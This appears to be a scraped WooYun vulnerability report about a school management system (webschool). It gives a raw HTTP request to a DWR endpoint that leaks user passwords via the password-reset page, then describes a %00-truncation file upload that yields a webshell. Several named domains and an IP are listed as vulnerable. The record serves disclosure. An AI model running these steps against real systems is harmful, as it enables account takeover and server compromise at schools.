{"id": 43796, "wybug_id": "wooyun-2014-081644", "wybug_title": "某数字校园系统从忘记密码到文件上传Getshell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Coody", "wybug_date": "2014-11-04 14:15", "wybug_open_date": "2015-02-02 14:16", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-02：\t细节向公众公开  简要描述： ... 详细说明：  前人提交的： WooYun: 某用户量特别大的数字校园系统一处奇葩漏洞直接爆管理员密码 0x01:密码找回分析测试发现，根目录下或者 webschool 目录下都存在找回密码的页面get_pwd.jsp但无论有多少个get_pwd.jsp页面，核心是通过 webschool/dwr/call/plaincall/UserDWR.getUsUserMap.dwr来获取用户名、密码、用户编号等信息\nPOST /webschool/dwr/call/plaincall/UserDWR.getUsUserMap.dwr HTTP/1.1Host: www.xxoo.comProxy-Connection: keep-aliveContent-Length: 370Origin: http://www.xxoo.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36Content-Type: text/plainAccept: */*Referer: http://www.xxoo.com/webschool/get_pwd.jspAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,fr;q=0.4,ja;q=0.2,ko;q=0.2,ru;q=0.2,vi;q=0.2,zh-TW;q=0.2,es;q=0.2,th;q=0.2Cookie: JSESSIONID=86ad36dd93a043da5f62b1998ede; 0.07595436880365014callCount=1page=/webschool/get_pwd.jsphttpSessionId=86ad36dd93a043da5f62b1998edescriptSessionId=1353434A757CF0B034B10A0341A05810747c0-scriptName=UserDWRc0-methodName=getUsUserMapc0-id=0c0-param0=number:1c0-param1=string:%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E7%94%A8%E6%88%B7c0-param2=string:111.127.33.137c0-param3=string:0102c0-param4=string:adminbatchId=5\n这里插一句话：话说这个系统真心人性化，生怕你找不到用户名都有什么，打开页面http://www.xxoo.com/Search/result.jsp 搜索 用户信息，如“张”,得到结果中姓名那一列冒号(:)前面即为用户名\n\n 漏洞利用案例：1# http://www.bndjw.com/webschool/get_pwd.jsp   用户admin\n\n2# http://58.214.27.195/webschool/get_pwd.jsp   用户test\n\n（不一一截图了）3# oa.xndxfz.com4# oa.bsyey.com5# ltzx.zhedu.net.cn6# www.wxzzyey.com0x02:文件上传导致Getshell登录任意用户帐号可通过:A. 密码找回漏洞B. 验证码设计缺陷可暴力破解成功登录后，直接打开“**的磁盘”功能， http://www.xxoo.com/webschool/OA/Disk/\n\n上传时抓包修改文件扩展名，用%00截断\n\n最终可从反馈信息中得到上传成功后的文件地址\n\nhttp://58.214.27.195/webschool/xheditor/upload/1/test/OA/Disk/img/wooyun.jsp\n\n\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 Coody@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-11-09 09:19 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}